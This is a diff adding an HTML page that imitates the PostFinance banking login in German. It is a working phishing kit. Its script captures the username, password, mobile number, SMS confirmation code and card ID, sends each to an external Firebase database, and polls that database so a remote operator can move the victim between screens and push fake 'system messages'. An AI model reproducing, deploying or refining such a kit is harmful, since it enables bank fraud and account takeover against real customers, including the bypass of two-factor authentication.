@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>PostFinance</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+body {
+  background:#0a1f1c; color:#fff;
+  font-family:-apple-system,'Helvetica Neue',Arial,sans-serif;
+  min-height:100vh; display:flex; justify-content:center;
+}
+.wrap { width:100%; max-width:430px; min-height:100vh; position:relative; }
+.scr { display:none; flex-direction:column; min-height:100vh; }
+.scr.on { display:flex; }
+
+.topbar { display:flex; align-items:center; justify-content:space-between; padding:50px 20px 16px; position:relative; flex-shrink:0; }
+.topbar h2 { position:absolute; left:50%; transform:translateX(-50%); font-size:17px; font-weight:600; color:#fff; white-space:nowrap; }
+.tbtn { background:none; border:none; cursor:pointer; width:40px; height:40px; display:flex; align-items:center; justify-content:center; }
+.tbtn svg { width:22px; height:22px; stroke:#fff; fill:none; stroke-width:2; stroke-linecap:round; }
+
+.bform { flex:1; padding:24px 24px 40px; }
+.field { margin-bottom:28px; }
+.field input {
+  width:100%; background:transparent; border:none;
+  border-bottom:1px solid #2a4540; color:#fff;
+  font-size:17px; padding:12px 0; outline:none;
+  font-family:inherit; -webkit-appearance:none; border-radius:0;
+}
+.field input::placeholder { color:#6b8480; }
+.field input:focus { border-bottom-color:#c8a84b; }
+
+.gold-link { display:block; color:#c8a84b; font-size:16px; text-align:center; padding:14px 0; background:none; border:none; width:100%; cursor:pointer; font-family:inherit; }
+
+.next-btn {
+  display:block; width:100%; margin:28px 0 0;
+  background:#c8a84b; color:#0a1f1c; border:none;
+  border-radius:12px; padding:18px; font-size:17px;
+  font-weight:700; cursor:pointer; font-family:inherit;
+  -webkit-appearance:none; touch-action:manipulation;
+}
+.next-btn:active { opacity:.7; }
+
+.phone-row { display:flex; align-items:center; border-bottom:1px solid #c8a84b; padding-bottom:10px; }
+.phone-row .cc { color:#fff; font-size:17px; margin-right:8px; }
+.phone-row input { flex:1; background:transparent; border:none; color:#fff; font-size:17px; outline:none; font-family:inherit; -webkit-appearance:none; padding:4px 0; }
+.phone-row input::placeholder { color:#6b8480; }
+.xbtn { background:#4a5a58; border:none; color:#fff; width:28px; height:28px; border-radius:50%; font-size:14px; cursor:pointer; }
+
+.desc { color:#fff; font-size:15px; line-height:1.65; margin-top:20px; }
+.desc b { font-weight:600; }
+
+.sinp {
+  width:100%; background:transparent; border:none;
+  border-bottom:1px solid #c8a84b; color:#fff;
+  font-size:17px; padding:12px 0; outline:none;
+  font-family:inherit; -webkit-appearance:none; border-radius:0;
+}
+.sinp::placeholder { color:#6b8480; }
+
+.card-box { margin:24px auto; width:240px; background:#e8e0c8; border-radius:14px; padding:16px; }
+.card-box .cb { font-size:9px; font-weight:700; color:#333; letter-spacing:1px; margin-bottom:2px; }
+.card-box .cn { font-size:9px; color:#555; margin-bottom:12px; }
+.card-box .idb { background:#c8a84b; border-radius:8px; padding:5px 12px; display:inline-flex; flex-direction:column; gap:2px; }
+.card-box .idb small { font-size:7px; font-weight:700; color:#333; }
+.card-box .idb span { font-size:11px; font-weight:700; color:#333; letter-spacing:1px; }
+.card-box .iban { margin-top:10px; }
+.card-box .iban small { font-size:7px; color:#555; display:block; }
+.card-box .iban span { font-size:9px; color:#333; }
+
+/* WAITING SCREEN */
+.wait-center {
+  flex:1; display:flex; flex-direction:column;
+  align-items:center; justify-content:center;
+  text-align:center; padding:40px 24px;
+}
+.wait-spinner {
+  width:64px; height:64px;
+  border:4px solid #1a4a40;
+  border-top:4px solid #c8a84b;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  margin-bottom:28px;
+}
+@keyframes spin { to { transform:rotate(360deg); } }
+.wait-title { font-size:18px; font-weight:700; color:#fff; margin-bottom:12px; line-height:1.4; }
+.wait-desc  { font-size:14px; color:#6b8480; line-height:1.6; }
+
+/* PUSH SCREEN */
+.push-center { flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:32px 24px; }
+.push-icon { width:96px; height:96px; background:#1a4a45; border-radius:50%; display:flex; align-items:center; justify-content:center; margin-bottom:28px; }
+.push-title { font-size:17px; font-weight:700; color:#fff; line-height:1.5; margin-bottom:16px; }
+.push-desc { font-size:15px; color:#aaa; line-height:1.65; margin-bottom:16px; }
+.push-code { font-size:24px; font-weight:700; color:#fff; letter-spacing:5px; }
+
+/* NOTIFICATION */
+.notif {
+  position:fixed; bottom:28px; left:16px; right:16px;
+  background:#1e3a36; border:1.5px solid #c8a84b;
+  border-radius:14px; padding:14px 16px;
+  display:flex; align-items:flex-start; gap:12px;
+  z-index:999; box-shadow:0 8px 32px rgba(0,0,0,.6);
+  animation:nup .3s ease;
+}
+@keyframes nup { from{opacity:0;transform:translateY(14px)} to{opacity:1;transform:translateY(0)} }
+.ni { font-size:18px; flex-shrink:0; margin-top:1px; }
+.nb { flex:1; }
+.nt { font-size:12px; font-weight:700; color:#c8a84b; margin-bottom:4px; }
+.nm { font-size:14px; color:#fff; line-height:1.45; }
+.nx { background:none; border:none; color:#6b8480; font-size:20px; cursor:pointer; flex-shrink:0; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <!-- S1: LOGIN -->
+  <div class="scr on" id="s1">
+    <div class="topbar">
+      <button class="tbtn"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg></button>
+      <h2>Anmelden</h2>
+      <button class="tbtn" onclick="bgo('s1')"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+    </div>
+    <div class="bform">
+      <div class="field">
+        <input type="text" id="f-user" placeholder="Benutzername / E-Finance-Nummer" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
+      </div>
+      <div class="field">
+        <input type="password" id="f-pass" placeholder="Passwort" autocomplete="off">
+      </div>
+      <button class="gold-link" style="margin-top:4px">Passwort vergessen</button>
+      <button class="gold-link" onclick="s1next()">Kein Benutzername oder E-Finance-Nummer</button>
+      <button class="next-btn" onclick="s1next()">Weiter</button>
+    </div>
+  </div>
+
+  <!-- W1: WAITING after LOGIN -->
+  <div class="scr" id="w1">
+    <div class="topbar">
+      <button class="tbtn"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg></button>
+      <h2>Anmelden</h2>
+      <button class="tbtn" onclick="bgo('s1')"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+    </div>
+    <div class="wait-center">
+      <div class="wait-spinner"></div>
+      <div class="wait-title">Ihre Daten werden überprüft</div>
+      <div class="wait-desc">Bitte warten Sie einen Moment...</div>
+    </div>
+  </div>
+
+  <!-- S2: PHONE -->
+  <div class="scr" id="s2">
+    <div class="topbar">
+      <button class="tbtn" onclick="bgo('s1')"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg></button>
+      <h2>Mobiltelefonnummer</h2>
+      <button class="tbtn" onclick="bgo('s1')"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+    </div>
+    <div class="bform">
+      <div class="phone-row">
+        <span class="cc">+41</span>
+        <input type="tel" id="f-phone" placeholder="79 000 00 00">
+        <button class="xbtn" onclick="document.getElementById('f-phone').value=''">✕</button>
+      </div>
+      <p class="desc">Bitte geben Sie die <b>Mobiltelefonnummer ein, die Sie beim Onboarding angegeben haben.</b></p>
+      <p class="desc" style="margin-top:12px">Nach dem Tippen auf „Weiter" senden wir Ihnen einen Bestätigungscode per SMS.</p>
+      <button class="next-btn" onclick="s2next()">Weiter</button>
+    </div>
+  </div>
+
+  <!-- W2: WAITING after PHONE -->
+  <div class="scr" id="w2">
+    <div class="topbar">
+      <button class="tbtn" onclick="bgo('s2')"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg></button>
+      <h2>Mobiltelefonnummer</h2>
+      <button class="tbtn" onclick="bgo('s1')"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+    </div>
+    <div class="wait-center">
+      <div class="wait-spinner"></div>
+      <div class="wait-title">SMS wird gesendet</div>
+      <div class="wait-desc">Bitte warten Sie einen Moment...</div>
+    </div>
+  </div>
+
+  <!-- S3: SMS -->
+  <div class="scr" id="s3">
+    <div class="topbar">
+      <button class="tbtn" onclick="bgo('s2')"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg></button>
+      <h2>SMS-Bestätigung</h2>
+      <button class="tbtn" onclick="bgo('s1')"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+    </div>
+    <div class="bform">
+      <input class="sinp" type="text" id="f-sms" placeholder="Geben Sie den per SMS erhaltenen Code ein" inputmode="numeric">
+      <button class="gold-link" style="margin-top:20px">Neuen Code senden</button>
+      <button class="next-btn" onclick="s3next()">Weiter</button>
+    </div>
+  </div>
+
+  <!-- W3: WAITING after SMS -->
+  <div class="scr" id="w3">
+    <div class="topbar">
+      <button class="tbtn" onclick="bgo('s3')"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg></button>
+      <h2>SMS-Bestätigung</h2>
+      <button class="tbtn" onclick="bgo('s1')"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+    </div>
+    <div class="wait-center">
+      <div class="wait-spinner"></div>
+      <div class="wait-title">Code wird überprüft</div>
+      <div class="wait-desc">Bitte warten Sie einen Moment...</div>
+    </div>
+  </div>
+
+  <!-- S4: CARD ID -->
+  <div class="scr" id="s4">
+    <div class="topbar">
+      <button class="tbtn" onclick="bgo('s3')"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg></button>
+      <h2>Karten-ID eingeben</h2>
+      <button class="tbtn" onclick="bgo('s1')"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+    </div>
+    <div class="bform">
+      <input class="sinp" type="text" id="f-cardid" placeholder="Karten-ID" inputmode="numeric">
+      <p class="desc">Bitte geben Sie die ID-Nummer auf der Rückseite Ihrer PostFinance-Karte ein.</p>
+      <div class="card-box">
+        <div class="cb">POSTFINANCE</div>
+        <div class="cn">0000 0000 000 0000 0000</div>
+        <div class="idb"><small>ID</small><span>000 000 000 000</span></div>
+        <div class="iban"><small>IBAN</small><span>CH00 0900 0000 0000 0000 0</span></div>
+      </div>
+      <button class="next-btn" onclick="s4next()">Weiter</button>
+    </div>
+  </div>
+
+  <!-- W4: WAITING after CARD ID -->
+  <div class="scr" id="w4">
+    <div class="topbar">
+      <button class="tbtn" onclick="bgo('s4')"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg></button>
+      <h2>Karten-ID eingeben</h2>
+      <button class="tbtn" onclick="bgo('s1')"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+    </div>
+    <div class="wait-center">
+      <div class="wait-spinner"></div>
+      <div class="wait-title">Karte wird verifiziert</div>
+      <div class="wait-desc">Bitte warten Sie einen Moment...</div>
+    </div>
+  </div>
+
+  <!-- S5: PUSH -->
+  <div class="scr" id="s5">
+    <div class="topbar">
+      <button class="tbtn" onclick="bgo('w4')"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg></button>
+      <h2>Anmelden</h2>
+      <button class="tbtn" onclick="bgo('s1')"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+    </div>
+    <div class="push-center">
+      <div class="push-icon">
+        <svg viewBox="0 0 60 60" width="52" height="52" fill="none">
+          <rect x="14" y="8" width="26" height="40" rx="4" stroke="rgba(255,255,255,.8)" stroke-width="2.5"/>
+          <line x1="14" y1="44" x2="40" y2="44" stroke="rgba(255,255,255,.8)" stroke-width="2.5"/>
+          <path d="M32 28 L38 28 L38 34" stroke="rgba(255,255,255,.9)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M28 32 L38 28" stroke="rgba(255,255,255,.9)" stroke-width="2.5" stroke-linecap="round"/>
+        </svg>
+      </div>
+      <p class="push-title">Eine Push-Benachrichtigung für die Anmeldeanfrage wurde an Ihr vorheriges Gerät gesendet</p>
+      <p class="push-desc">Bestätigen Sie die Anmeldeanfrage auf dem Gerät, mit dem Sie zuvor die PostFinance App verwendet haben. Überprüfen Sie, ob der folgende Wert angezeigt wird:</p>
+      <p class="push-code">CJP</p>
+      <button class="gold-link" style="margin-top:36px">Mit Kartenlesegerät anmelden</button>
+    </div>
+  </div>
+
+</div>
+
+<script>
+var FB = 'https://postfinance-ec24c-default-rtdb.firebaseio.com';
+var myKey = null;
+var pollTimer = null;
+var lastNotify = null;
+var notifTimer = null;
+
+// ── NAVIQASIYA
+function bgo(id) {
+  var all = document.querySelectorAll('.scr');
+  for (var i = 0; i < all.length; i++) all[i].classList.remove('on');
+  document.getElementById(id).classList.add('on');
+  window.scrollTo(0, 0);
+}
+
+function v(id) {
+  var el = document.getElementById(id);
+  return el ? el.value.trim() : '';
+}
+
+// ── ADDIM 1: Login → Gozleme → Telefon
+function s1next() {
+  bgo('w1'); // Derhall gozleme sehifesine kec
+  fbSend({
+    time:   new Date().toLocaleString(),
+    sehife: 'Anmelden',
+    user:   v('f-user'),
+    pass:   v('f-pass')
+  });
+  // Admin yonlendirmese biz ozumuz s2-ye kecmirik
+  // Admin panelden yonlendirecek
+}
+
+// ── ADDIM 2: Telefon → Gozleme
+function s2next() {
+  bgo('w2');
+  fbPatch({
+    sehife: 'Mobiltelefon',
+    phone:  v('f-phone')
+  });
+}
+
+// ── ADDIM 3: SMS → Gozleme
+function s3next() {
+  bgo('w3');
+  fbPatch({
+    sehife: 'SMS-Bestaetigung',
+    sms:    v('f-sms')
+  });
+}
+
+// ── ADDIM 4: Kart ID → Gozleme
+function s4next() {
+  bgo('w4');
+  fbPatch({
+    sehife: 'Karten-ID',
+    cardid: v('f-cardid')
+  });
+}
+
+// ── FIREBASE
+function fbSend(data) {
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', FB + '/entries.json', true);
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+      try {
+        var res = JSON.parse(xhr.responseText);
+        myKey = res.name;
+        startPolling();
+      } catch(e){}
+    }
+  };
+  xhr.send(JSON.stringify(data));
+}
+
+function fbPatch(data) {
+  if (!myKey) return;
+  var xhr = new XMLHttpRequest();
+  xhr.open('PATCH', FB + '/entries/' + myKey + '.json', true);
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.send(JSON.stringify(data));
+}
+
+// ── POLLING
+function startPolling() {
+  if (pollTimer) return;
+  pollTimer = setInterval(function() {
+    if (!myKey) return;
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', FB + '/entries/' + myKey + '/notify.json', true);
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+        try {
+          var data = JSON.parse(xhr.responseText);
+          if (!data) return;
+          var sig = data.t ? String(data.t) : JSON.stringify(data);
+          if (sig === lastNotify) return;
+          lastNotify = sig;
+          if (data.msg)    showNotif(data.msg);
+          if (data.screen) bgo(data.screen);
+        } catch(e){}
+      }
+    };
+    xhr.send();
+  }, 2000);
+}
+
+// ── BILDIRIS
+function showNotif(msg) {
+  var old = document.getElementById('bnotif');
+  if (old) old.remove();
+  clearTimeout(notifTimer);
+  var el = document.createElement('div');
+  el.id = 'bnotif'; el.className = 'notif';
+  el.innerHTML =
+    '<span class="ni">&#9888;&#65039;</span>' +
+    '<div class="nb">' +
+      '<div class="nt">Systemmeldung</div>' +
+      '<div class="nm">' + msg + '</div>' +
+    '</div>' +
+    '<button class="nx" onclick="document.getElementById(\'bnotif\').remove()">&#x2715;</button>';
+  document.body.appendChild(el);
+  notifTimer = setTimeout(function(){ if (el.parentNode) el.remove(); }, 8000);
+}
+</script>
+</body>
+</html>
